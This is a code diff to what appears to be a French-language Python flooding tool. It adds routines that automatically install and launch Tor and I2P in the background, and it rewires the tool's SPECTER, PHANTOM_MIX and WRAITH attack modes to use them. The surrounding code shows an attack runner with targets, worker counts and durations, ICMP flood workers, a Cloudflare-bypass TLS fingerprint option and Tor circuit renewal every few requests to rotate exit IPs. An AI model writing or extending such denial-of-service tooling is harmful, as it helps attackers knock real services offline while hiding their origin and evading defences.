@@ -849,6 +849,255 @@ def _worker_icmp(host: str, stats: Stats):
         except Exception:
             stats.hit(False)
 
+# ─── AUTO-INSTALL ANONYMISEURS ───────────────────────────────
+
+import subprocess as _sp
+import urllib.request as _ureq
+import zipfile, tarfile, tempfile, stat as _stat_mod
+
+def _pip_install(*pkgs):
+    """Installe des packages pip silencieusement."""
+    info(f"pip install {' '.join(pkgs)}...")
+    try:
+        _sp.run([sys.executable, "-m", "pip", "install", "--quiet", *pkgs],
+                check=True, timeout=120)
+        ok(f"Installé : {', '.join(pkgs)}")
+        return True
+    except Exception as e:
+        warn(f"pip install échoué : {e}"); return False
+
+def _wait_port(host, port, timeout=60, label="service"):
+    """Attend qu'un port TCP soit ouvert (max timeout secondes)."""
+    deadline = time.time() + timeout
+    info(f"Attente de {label} sur {host}:{port} (max {timeout}s)...")
+    while time.time() < deadline:
+        try:
+            s = socket.socket(); s.settimeout(1)
+            s.connect((host, port)); s.close(); return True
+        except Exception:
+            time.sleep(2)
+    return False
+
+def _detect_pkg_manager():
+    """Retourne le gestionnaire de paquets système disponible ou None."""
+    for mgr in ("apt-get", "apt", "dnf", "yum", "pacman", "brew"):
+        if _sp.run(["which" if sys.platform != "win32" else "where", mgr],
+                   capture_output=True).returncode == 0:
+            return mgr
+    return None
+
+def _sys_install(pkg_map: dict):
+    """
+    pkg_map = {"apt-get": ["tor"], "brew": ["tor"], ...}
+    Tente l'installation via le gestionnaire détecté.
+    """
+    mgr = _detect_pkg_manager()
+    if not mgr:
+        warn("Aucun gestionnaire de paquets trouvé."); return False
+    pkgs = pkg_map.get(mgr, pkg_map.get("apt-get", []))
+    if not pkgs:
+        return False
+    info(f"Installation via {mgr} : {' '.join(pkgs)}...")
+    try:
+        if mgr == "brew":
+            _sp.run(["brew", "install", *pkgs], check=True, timeout=300)
+        elif mgr == "pacman":
+            _sp.run(["sudo", "pacman", "-S", "--noconfirm", *pkgs], check=True, timeout=300)
+        else:
+            _sp.run(["sudo", mgr, "install", "-y", *pkgs], check=True, timeout=300)
+        ok(f"Installé via {mgr}.")
+        return True
+    except Exception as e:
+        warn(f"Installation système échouée : {e}"); return False
+
+def _start_tor_service():
+    """Démarre le service Tor (Linux/macOS)."""
+    if sys.platform == "win32":
+        return
+    mgr = _detect_pkg_manager()
+    try:
+        if mgr == "brew":
+            _sp.Popen(["brew", "services", "start", "tor"],
+                      stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
+        else:
+            # essai systemctl puis service
+            if _sp.run(["sudo", "systemctl", "start", "tor"],
+                       capture_output=True).returncode != 0:
+                _sp.run(["sudo", "service", "tor", "start"], capture_output=True)
+    except Exception:
+        pass
+
+def _download_tor_windows():
+    """Télécharge et démarre le Tor Expert Bundle sur Windows."""
+    # URL stable de l'archive Windows (sans GUI)
+    base = "https://dist.torproject.org/torbrowser/"
+    # On cherche la dernière version dans les redirects courants
+    versions = ["14.0.7", "14.0.5", "14.0.3", "13.5.9", "13.5.7"]
+    tmp = os.environ.get("TEMP", "C:\\Temp")
+    tor_dir = os.path.join(tmp, "meow_tor")
+    tor_exe = os.path.join(tor_dir, "tor", "tor.exe")
+
+    if os.path.exists(tor_exe):
+        info(f"Tor Expert Bundle trouvé : {tor_exe}")
+        _launch_tor_windows(tor_exe, tor_dir)
+        return os.path.exists(tor_exe)
+
+    info("Téléchargement Tor Expert Bundle (Windows)...")
+    os.makedirs(tor_dir, exist_ok=True)
+    for ver in versions:
+        url = f"{base}{ver}/tor-expert-bundle-windows-x86_64-{ver}.tar.gz"
+        dest = os.path.join(tmp, "tor_expert.tar.gz")
+        try:
+            info(f"  Essai version {ver}...")
+            _ureq.urlretrieve(url, dest)
+            with tarfile.open(dest, "r:gz") as tf:
+                tf.extractall(tor_dir)
+            ok(f"Tor {ver} extrait dans {tor_dir}")
+            _launch_tor_windows(tor_exe, tor_dir)
+            return True
+        except Exception as e:
+            warn(f"  {ver} : {e}")
+    err("Impossible de télécharger Tor Expert Bundle.")
+    info("Télécharge manuellement : https://www.torproject.org/download/tor/")
+    return False
+
+_tor_proc_ref = [None]  # stocke le process Tor lancé
+
+def _launch_tor_windows(tor_exe, tor_dir):
+    """Lance tor.exe en arrière-plan sur Windows."""
+    if not os.path.exists(tor_exe):
+        return
+    try:
+        p = _sp.Popen([tor_exe], cwd=tor_dir,
+                      stdout=_sp.DEVNULL, stderr=_sp.DEVNULL,
+                      creationflags=_sp.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
+        _tor_proc_ref[0] = p
+        info("Tor lancé en arrière-plan (tor.exe)...")
+    except Exception as e:
+        warn(f"Impossible de lancer tor.exe : {e}")
+
+def _ensure_tor():
+    """
+    S'assure que Tor tourne sur 127.0.0.1:9050.
+    Installe et démarre automatiquement si absent.
+    Retourne True si Tor est opérationnel.
+    """
+    if _tor_available():
+        return True
+
+    warn("Tor non détecté — installation automatique...")
+    console.print()
+
+    if sys.platform == "win32":
+        # 1. Chercher tor.exe du Tor Browser installé
+        tb_paths = [
+            r"C:\Users\{}\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe".format(
+                os.environ.get("USERNAME", "user")),
+            r"C:\Program Files\Tor Browser\Browser\TorBrowser\Tor\tor.exe",
+            r"C:\Program Files (x86)\Tor Browser\Browser\TorBrowser\Tor\tor.exe",
+        ]
+        for p in tb_paths:
+            if os.path.exists(p):
+                info(f"Tor Browser trouvé : {p}")
+                _launch_tor_windows(p, os.path.dirname(p))
+                if _wait_port("127.0.0.1", 9050, timeout=30, label="Tor"):
+                    return True
+        # 2. Essai winget
+        info("Essai installation via winget...")
+        try:
+            _sp.run(["winget", "install", "-e", "--id",
+                     "TorProject.TorBrowser", "--silent", "--accept-package-agreements"],
+                    timeout=300, check=True, capture_output=True)
+            ok("Tor Browser installé via winget.")
+            info("Ouvre Tor Browser une première fois pour démarrer Tor sur le port 9050.")
+            return False  # l'utilisateur doit l'ouvrir manuellement
+        except Exception:
+            pass
+        # 3. Télécharger l'expert bundle
+        if _download_tor_windows():
+            if _wait_port("127.0.0.1", 9050, timeout=60, label="Tor"):
+                return True
+    else:
+        # Linux / macOS
+        pkg_map = {
+            "apt-get": ["tor"],
+            "apt":     ["tor"],
+            "dnf":     ["tor"],
+            "yum":     ["tor"],
+            "pacman":  ["tor"],
+            "brew":    ["tor"],
+        }
+        if _sys_install(pkg_map):
+            _start_tor_service()
+            if _wait_port("127.0.0.1", 9050, timeout=45, label="Tor"):
+                return True
+
+    err("Tor n'a pas pu être démarré automatiquement.")
+    console.print(f"  [{CY}]Windows :[/] Ouvre Tor Browser → le port 9050 s'active")
+    console.print(f"  [{CY}]Linux   :[/] sudo apt install tor && sudo systemctl start tor")
+    console.print(f"  [{CY}]macOS   :[/] brew install tor && brew services start tor")
+    return False
+
+def _ensure_i2p():
+    """
+    S'assure que le proxy I2P tourne sur 127.0.0.1:4444.
+    Installe et démarre automatiquement sur Linux si absent.
+    Retourne True si I2P est opérationnel.
+    """
+    if _i2p_available():
+        return True
+
+    warn("I2P non détecté — tentative d'installation automatique...")
+    console.print()
+
+    if sys.platform == "linux":
+        pkg_map = {
+            "apt-get": ["i2p"],
+            "apt":     ["i2p"],
+        }
+        if _sys_install(pkg_map):
+            try:
+                _sp.Popen(["i2prouter", "start"],
+                          stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
+                ok("i2prouter start lancé — attente démarrage (peut prendre 1-2 min)...")
+                if _wait_port("127.0.0.1", 4444, timeout=120, label="I2P"):
+                    ok("I2P proxy HTTP opérationnel sur 127.0.0.1:4444")
+                    return True
+            except Exception as e:
+                warn(f"i2prouter : {e}")
+    elif sys.platform == "darwin":
+        info("Sur macOS, installe I2P manuellement :")
+    else:  # Windows
+        info("Sur Windows, installe I2P manuellement :")
+
+    err("I2P n'a pas pu être démarré automatiquement.")
+    console.print(f"  [{CY}]Linux   :[/] sudo apt install i2p && i2prouter start")
+    console.print(f"  [{CY}]Windows :[/] https://geti2p.net/en/download → active le proxy HTTP port 4444")
+    console.print(f"  [{CY}]macOS   :[/] https://geti2p.net/en/download → java -jar i2pinstall.jar")
+    return False
+
+def _ensure_stem():
+    """Installe stem si absent (nécessaire pour le circuit renewal Tor)."""
+    try:
+        import stem  # noqa
+        return True
+    except ImportError:
+        return _pip_install("stem")
+
+def _ensure_socks():
+    """Installe PySocks si absent."""
+    global HAS_SOCKS, _socks
+    if HAS_SOCKS:
+        return True
+    if _pip_install("PySocks"):
+        try:
+            import socks as _socks  # noqa: F811
+            HAS_SOCKS = True
+            return True
+        except ImportError:
+            pass
+    return False
+
 # ─── SPECTER — Tor Anonymous Flood ──────────────────────────
 
 _TOR_SOCKS      = {"http": "socks5://127.0.0.1:9050",
@@ -1607,64 +1856,44 @@ def _run_attack(target: str, method: str, workers: int, duration: int,
     if use_cffi:
         ok(f"[bold {G1}]curl_cffi mode[/] — TLS fingerprint = Chrome (Cloudflare bypass actif)")
 
-    # ── SPECTER : vérification Tor + init ─────────────────────
+    # ── SPECTER : auto-install Tor + stem ─────────────────────
     specter_lock    = None
     specter_counter = None
     specter_exit_ip = None
     specter_renew   = None
     if method == "SPECTER":
-        if not _tor_available():
-            err("Tor n'est pas détecté sur 127.0.0.1:9050 !")
-            console.print()
-            info("Pour utiliser SPECTER, Tor doit tourner localement :")
-            console.print(f"  [{CY}]Windows :[/] installe Tor Browser — ouvre-le → Tor tourne automatiquement")
-            console.print(f"  [{CY}]Linux   :[/] sudo apt install tor && sudo systemctl start tor")
-            console.print(f"  [{CY}]macOS   :[/] brew install tor && brew services start tor")
-            console.print()
-            info("Circuit renewal automatique via stem (optionnel) :")
-            console.print(f"  [{CY}]pip install stem[/]")
-            console.print(f"  [{DM}]Puis activer le Control Port dans torrc :[/]")
-            console.print(f"  [{DM}]ControlPort 9051[/]")
-            console.print(f"  [{DM}]CookieAuthentication 1[/]")
-            return
-        info(f"Tor détecté sur [{G1}]127.0.0.1:9050[/] — récupération de l'exit IP...")
+        if not _ensure_tor():
+            err("Tor indisponible — SPECTER annulé."); return
+        # stem pour circuit renewal (optionnel mais recommandé)
+        _ensure_stem()
+        info(f"Tor opérationnel sur [{G1}]127.0.0.1:9050[/] — récupération de l'exit IP...")
         initial_exit = _tor_get_exit_ip()
         ok(f"Exit IP actuelle : [{G1}]{initial_exit}[/]")
         specter_exit_ip = [initial_exit]
         specter_lock    = threading.Lock()
         specter_counter = [0]
-        specter_renew   = workers * 3   # renouveler après workers×3 requêtes totales
+        specter_renew   = workers * 3
         ok(f"Circuit renewal : toutes les [{G1}]{specter_renew}[/] requêtes")
         console.print()
 
-    # ── PHANTOM_MIX : vérification Tor + I2P ────────────────────
+    # ── PHANTOM_MIX : auto-install Tor + I2P ────────────────────
     if method == "PHANTOM_MIX":
-        tor_ok = _tor_available()
-        i2p_ok = _i2p_available()
+        _ensure_socks()
+        tor_ok = _ensure_tor() if not _tor_available() else True
+        i2p_ok = _ensure_i2p() if not _i2p_available() else True
         if not tor_ok and not i2p_ok:
-            err("PHANTOM_MIX : ni Tor ni I2P détecté !")
-            console.print()
-            info("Pour utiliser PHANTOM_MIX, Tor et/ou I2P doivent tourner localement.")
-            console.print(f"  [{CY}]Tor  :[/] Tor Browser (Windows) / sudo systemctl start tor (Linux)")
-            console.print(f"  [{CY}]I2P  :[/] https://geti2p.net/en/download  → proxy HTTP 127.0.0.1:4444")
-            return
+            err("PHANTOM_MIX : ni Tor ni I2P n'ont pu démarrer."); return
+        if tor_ok: _ensure_stem()
         modes = (["Tor"] if tor_ok else []) + (["I2P"] if i2p_ok else [])
-        ok(f"PHANTOM_MIX : [{G1}]{' + '.join(modes)}[/] détecté — rotation aléatoire entre les réseaux")
+        ok(f"PHANTOM_MIX : [{G1}]{' + '.join(modes)}[/] — rotation aléatoire entre les réseaux")
         console.print()
 
-    # ── WRAITH : vérification I2P ─────────────────────────────
+    # ── WRAITH : auto-install I2P ─────────────────────────────
     if method == "WRAITH":
-        if not _i2p_available():
-            err("I2P n'est pas détecté sur 127.0.0.1:4444 !")
-            console.print()
-            info("Pour utiliser WRAITH, I2P doit tourner avec le proxy HTTP activé :")
-            console.print(f"  [{CY}]Windows/Linux/macOS :[/] télécharge I2P → https://geti2p.net/en/download")
-            console.print(f"  [{CY}]Linux :[/] sudo apt install i2p && i2prouter start")
-            console.print(f"  [{DM}]Puis dans la console I2P (http://127.0.0.1:7657) :[/]")
-            console.print(f"  [{DM}]→ Tunnel Manager → HTTP Proxy → Port 4444 → Activer[/]")
-            return
-        info(f"I2P détecté sur [{G1}]127.0.0.1:4444[/] — garlic routing actif")
-        ok(f"Tunnels I2P en cours de construction (peut prendre 1-2 min au démarrage)...")
+        if not _ensure_i2p():
+            err("I2P indisponible — WRAITH annulé."); return
+        info(f"I2P opérationnel sur [{G1}]127.0.0.1:4444[/] — garlic routing actif")
+        ok("Tunnels I2P en cours de construction (peut prendre 1-2 min au démarrage)...")
         console.print()
 
     # ── PROXY HEALTHCHECK avant l'attaque ──────────────────────
